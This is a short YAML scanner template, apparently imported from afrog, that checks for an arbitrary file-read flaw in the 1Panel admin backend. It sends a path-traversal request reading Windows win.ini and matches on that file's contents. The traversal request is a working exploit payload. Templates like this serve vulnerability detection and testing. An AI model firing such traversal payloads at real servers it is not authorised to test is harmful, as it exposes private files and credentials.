# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - for 16-bit app support
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/systemController/showOrDownByurl.do?down=&dbPath=../../../../../Windows/win.ini'
id: 1panel-loadfile-fileread
info:
  author: peiqi
  description: 1Panel后台存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感信息文件
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 1Panel loadfile 后台文件读取漏洞
  severity: high
  tags: 1panel,fileread,argus-import
